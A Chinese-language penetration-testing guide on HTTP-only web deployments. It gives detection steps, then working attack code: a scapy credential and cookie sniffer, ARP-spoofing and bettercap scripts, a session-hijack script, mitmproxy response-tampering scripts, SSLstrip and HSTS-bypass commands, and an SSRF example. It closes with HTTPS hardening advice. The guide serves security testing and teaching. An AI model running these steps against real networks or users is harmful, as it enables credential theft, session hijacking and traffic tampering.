# HTTP-only 部署攻击

**文档版本：** 1.0  
**最后更新：** 2026 年 3 月  
**适用技能：** security-misconfiguration, cryptographic-failures

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化、可复现的 HTTP-only 部署检测与利用方法论。当目标应用仅通过 HTTP（未加密）协议部署，未配置 HTTPS/TLS 加密时，所有网络流量以明文传输，攻击者可通过中间人攻击窃取敏感信息、劫持会话、篡改数据。

## 1.2 适用范围

本文档适用于以下场景：
- Web 应用仅监听 HTTP 端口（80 或其他非 443 端口）
- 无 HTTPS 重定向配置
- 缺少 HSTS（HTTP Strict Transport Security）响应头
- Cookie 缺少 Secure 标志
- 内部网络应用、开发环境、CTF 挑战
- 云服务默认 HTTP 部署

**典型技术特征：**
- 仅 HTTP 端口监听（443 端口关闭）
- 响应头无 `Strict-Transport-Security`
- Cookie 无 `Secure` 标志
- `Server` 头暴露框架信息

## 1.3 读者对象

- 执行渗透测试的安全工程师
- 进行网络层攻击的分析师
- 红队渗透测试人员

---

# 第二部分：核心渗透技术专题

## 专题一：HTTP-only 部署检测与利用

### 2.1 技术介绍

**漏洞原理：**

HTTP-only 部署是指应用仅通过未加密的 HTTP 协议提供服务，未配置 HTTPS/TLS 加密。这导致：

1. **明文传输**：所有 HTTP 请求/响应以明文形式在网络中传输
2. **会话劫持**：攻击者可窃取 Cookie/Session 令牌
3. **凭证拦截**：用户名、密码等认证信息可被嗅探
4. **数据篡改**：中间人可修改传输内容
5. **敏感信息泄露**：所有业务数据暴露于网络监听者

**影响评估：**

| 影响类型 | 严重程度 | 说明 |
|---------|---------|------|
| 凭证窃取 | **CRITICAL** | 登录凭证明文可被截获 |
| 会话劫持 | **CRITICAL** | Cookie 可被窃取用于冒充 |
| 数据泄露 | **HIGH** | 所有业务数据明文传输 |
| 数据篡改 | **HIGH** | 中间人可修改响应内容 |
| 钓鱼攻击 | **MEDIUM** | 可注入钓鱼内容 |

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** | **攻击影响** |
|-------------|-------------|---------------|-------------|
| **内部管理系统** | 后台管理、运维面板 | 假设内网安全无需 HTTPS | 管理员凭证窃取 |
| **开发/测试环境** | 开发服务器、staging | 开发便利优先于安全 | 测试数据泄露 |
| **CTF 挑战应用** | 漏洞演示环境 | 故意简化配置 | 凭证/Flag 明文传输 |
| **物联网设备** | 设备配置界面 | 资源限制未配置 HTTPS | 设备控制权劫持 |
| **微服务 API** | 服务间 API 调用 | 假设网络隔离足够 | 服务间认证绕过 |
| **旧系统遗留** | 老式 Web 应用 | 历史原因未升级 | 全面数据泄露 |

### 2.3 漏洞探测方法

#### 2.3.1 端口扫描检测

```bash
# 使用 nmap 检测 HTTP/HTTPS 端口
nmap -sV -p 80,443 target

# 预期结果（HTTP-only）：
# 80/tcp   open  http    Werkzeug/3.0.6 Python/3.8.20
# 443/tcp  closed

# 使用 masscan 快速扫描
masscan -p80,443 target/24 --rate=1000
```

#### 2.3.2 响应头分析

```bash
# 检查响应头
curl -I http://target:port/

# 检查项（应缺失）：
# Strict-Transport-Security (HSTS)
# Content-Security-Policy
# X-Content-Type-Options

# 检查 Server 头是否暴露框架信息
# Server: Werkzeug/3.0.6 Python/3.8.20
```

#### 2.3.3 Cookie 安全检查

```bash
# 检查 Cookie 标志
curl -I http://target:port/login

# 检查 Set-Cookie 头：
# 应缺失 Secure 标志
# 应缺失 HttpOnly 标志
# 应缺失 SameSite 标志

# 示例（不安全）：
# Set-Cookie: session=abc123; Path=/
# 
# 示例（安全）：
# Set-Cookie: session=abc123; Path=/; Secure; HttpOnly; SameSite=Lax
```

#### 2.3.4 HTTPS 重定向检测

```bash
# 测试是否自动重定向到 HTTPS
curl -I http://target:port/

# 预期结果（无重定向）：
# HTTP/1.1 200 OK
# 无 Location: https:// 头

# 预期结果（有重定向）：
# HTTP/1.1 301 Moved Permanently
# Location: https://target/
```

#### 2.3.5 自动化检测脚本

```python
#!/usr/bin/env python3
"""
HTTP-only 部署检测脚本
"""

import requests
import sys

def detect_http_only(target_url):
    """检测目标是否仅 HTTP 部署"""
    
    print(f"[*] 检测目标：{target_url}\n")
    
    issues = []
    
    # 1. 检查 HTTPS 可访问性
    https_url = target_url.replace('http://', 'https://')
    try:
        resp = requests.get(https_url, timeout=5, verify=False)
        print(f"[+] HTTPS 可访问：{https_url}")
    except requests.exceptions.SSLError:
        print(f"[!] HTTPS 证书错误：{https_url}")
    except requests.exceptions.ConnectionError:
        print(f"[!] HTTPS 不可访问：{https_url}")
        issues.append("HTTPS 服务未配置")
    
    # 2. 检查 HTTP 响应
    resp = requests.get(target_url, timeout=10)
    
    # 3. 检查 HSTS 头
    if 'Strict-Transport-Security' not in resp.headers:
        print("[!] 缺少 HSTS 响应头")
        issues.append("缺少 HSTS")
    else:
        print(f"[+] HSTS 配置：{resp.headers['Strict-Transport-Security']}")
    
    # 4. 检查 Cookie 标志
    if 'Set-Cookie' in resp.headers:
        cookie = resp.headers['Set-Cookie']
        if 'Secure' not in cookie:
            print("[!] Cookie 缺少 Secure 标志")
            issues.append("Cookie 无 Secure")
        if 'HttpOnly' not in cookie:
            print("[!] Cookie 缺少 HttpOnly 标志")
            issues.append("Cookie 无 HttpOnly")
        if 'SameSite' not in cookie:
            print("[!] Cookie 缺少 SameSite 标志")
            issues.append("Cookie 无 SameSite")
    
    # 5. 检查 HTTPS 重定向
    if resp.status_code in [301, 302]:
        location = resp.headers.get('Location', '')
        if location.startswith('https://'):
            print("[+] 自动重定向到 HTTPS")
        else:
            print("[!] 重定向仍为 HTTP")
            issues.append("无 HTTPS 重定向")
    else:
        print("[!] 无 HTTPS 重定向")
        issues.append("无 HTTPS 重定向")
    
    # 6. 输出结论
    print(f"\n[*] 检测结果:")
    if issues:
        print(f"[!] 发现 {len(issues)} 个安全问题:")
        for issue in issues:
            print(f"    - {issue}")
        return True
    else:
        print("[+] 未发现明显安全问题")
        return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python detect_http_only.py <target_url>")
        sys.exit(1)
    
    detect_http_only(sys.argv[1])
```

### 2.4 漏洞利用方法

#### 2.4.1 网络嗅探凭证拦截

**场景：** 同一网络内嗅探 HTTP 流量

```bash
# 1. 启用网卡混杂模式
sudo ifconfig en0 promisc

# 2. 使用 tcpdump 捕获 HTTP 流量
sudo tcpdump -i en0 -A 'tcp port 80 and host target'

# 3. 使用 Wireshark 图形化分析
wireshark -i en0 -f "tcp port 80"

# 4. 过滤 POST 请求（登录凭证）
# Wireshark 过滤器：
http.request.method == "POST"
http contains "password"
```

**凭证提取脚本：**

```python
#!/usr/bin/env python3
"""
HTTP 凭证嗅探脚本
"""

from scapy.all import sniff, TCP
import re

def packet_callback(packet):
    if TCP in packet and packet[TCP].payload:
        data = str(packet[TCP].payload)
        
        # 提取用户名
        username_match = re.search(r'username[=:]([^\s&]+)', data, re.I)
        if username_match:
            print(f"\n[+] 捕获用户名：{username_match.group(1)}")
        
        # 提取密码
        password_match = re.search(r'password[=:]([^\s&]+)', data, re.I)
        if password_match:
            print(f"[+] 捕获密码：{password_match.group(1)}")
        
        # 提取 Cookie
        cookie_match = re.search(r'Cookie: ([^\r\n]+)', data, re.I)
        if cookie_match:
            print(f"[+] 捕获 Cookie: {cookie_match.group(1)}")

# 开始嗅探
print("[*] 开始嗅探 HTTP 流量...")
sniff(filter="tcp port 80", prn=packet_callback, store=0)
```

#### 2.4.2 ARP 欺骗中间人攻击

**场景：** 局域网内实施 ARP 欺骗

```bash
# 1. 启用 IP 转发
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# 2. 使用 arpspoof 进行 ARP 欺骗
# 欺骗目标（受害者）
sudo arpspoof -i en0 -t victim_ip gateway_ip

# 欺骗网关
sudo arpspoof -i en0 -t gateway_ip victim_ip

# 3. 使用 bettercap 进行综合攻击
bettercap -iface en0

# bettercap 命令：
# arp.spoof on
# net.sniff on
# hstshijack on
```

**使用 bettercap 自动化攻击：**

```bash
# 创建 bettercap 脚本
cat > attack.cap << 'EOF'
set arp.spoof.enabled true
set arp.spoof.targets victim_ip
set net.sniff.enabled true
set net.sniff.filter "tcp port 80"
hstshijack on
EOF

# 执行攻击
sudo bettercap -iface en0 -script attack.cap
```

#### 2.4.3 会话 Cookie 劫持

**场景：** 窃取会话 Cookie 冒充用户

```bash
# 1. 从嗅探流量中提取 Cookie
# 从 tcpdump/Wireshark 输出中查找：
# Set-Cookie: session=abc123xyz

# 2. 使用窃取的 Cookie 访问应用
curl -H "Cookie: session=abc123xyz" http://target:port/admin

# 3. 检查是否成功劫持
curl -H "Cookie: session=abc123xyz" http://target:port/api/user
```

**会话劫持自动化脚本：**

```python
#!/usr/bin/env python3
"""
会话劫持利用脚本
"""

import requests
import sys

def hijack_session(target_url, session_cookie):
    """使用窃取的会话 Cookie 访问目标"""
    
    cookies = {'session': session_cookie}
    
    # 测试会话是否有效
    resp = requests.get(f"{target_url}/api/user", cookies=cookies)
    
    if resp.status_code == 200:
        print("[+] 会话劫持成功!")
        print(f"用户信息：{resp.json()}")
        
        # 访问管理功能
        resp = requests.get(f"{target_url}/admin", cookies=cookies)
        if resp.status_code == 200:
            print("[+] 可访问管理后台")
        
        return True
    else:
        print("[-] 会话无效或已过期")
        return False

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: python session_hijack.py <target_url> <session_cookie>")
        sys.exit(1)
    
    hijack_session(sys.argv[1], sys.argv[2])
```

#### 2.4.4 响应内容篡改

**场景：** 中间人篡改 HTTP 响应

```bash
# 使用 bettercap 篡改响应
bettercap -iface en0

# bettercap 命令：
set http.proxy.enabled true
set http.proxy.inject "<script>alert('XSS')</script>"
http.proxy on

# 使用 mitmproxy 篡改
mitmproxy --mode transparent --set modify_body=/search/REPLACE/

# 使用 mitmproxy 脚本
cat > tamper.py << 'EOF'
from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    if "login" in flow.request.path:
        flow.response.text = flow.response.text.replace(
            "</body>",
            "<script>document.getElementById('password').value='hacked'</script></body>"
        )
EOF

mitmproxy -s tamper.py
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 HSTS 绕过

**场景：** 目标有 HSTS 但首次访问未加密

```bash
# 1. SSLstrip 攻击
sslstrip -l 8080 -w output.log

# 2. 使用 bettercap hstshijack
bettercap -iface en0
# hstshijack on

# 3. 针对未设置 includeSubDomains 的 HSTS
# 访问子域名可能绕过
curl http://subdomain.target.com
```

#### 2.5.2 网络隔离绕过

**场景：** 目标在隔离网络，无法直接嗅探

```bash
# 1. 通过已攻陷的主机实施嗅探
# 在内部主机上运行嗅探脚本

# 2. 使用 SSRF 漏洞间接访问
curl "http://vulnerable.com/fetch?url=http://internal-target/admin"

# 3. 通过 DNS 重绑定
# 使用 dnsrebind 工具将域名解析到内网 IP
```

---

# 第三部分：附录

## 3.1 HTTP-only 部署检测清单

| 检查项 | 检测方法 | 不安全特征 |
|-------|---------|-----------|
| HTTPS 端口 | nmap 扫描 | 443 端口关闭 |
| HSTS 头 | 检查响应头 | 无 Strict-Transport-Security |
| Cookie Secure | 检查 Set-Cookie | 无 Secure 标志 |
| Cookie HttpOnly | 检查 Set-Cookie | 无 HttpOnly 标志 |
| HTTPS 重定向 | curl 测试 | 无 301 到 HTTPS |
| 网络嗅探 | tcpdump | 可看到明文内容 |

## 3.2 修复建议

**针对开发者的修复指南：**

1. **配置 HTTPS**
   ```nginx
   server {
       listen 443 ssl;
       ssl_certificate /path/to/cert.pem;
       ssl_certificate_key /path/to/key.pem;
       ssl_protocols TLSv1.2 TLSv1.3;
   }
   
   server {
       listen 80;
       return 301 https://$host$request_uri;
   }
   ```

2. **配置 HSTS**
   ```nginx
   add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
   ```

3. **配置安全 Cookie**
   ```python
   app.config.update(
       SESSION_COOKIE_SECURE=True,
       SESSION_COOKIE_HTTPONLY=True,
       SESSION_COOKIE_SAMESITE='Lax'
   )
   ```

---

**文档版本：** 1.0  
**最后更新：** 2026 年 3 月
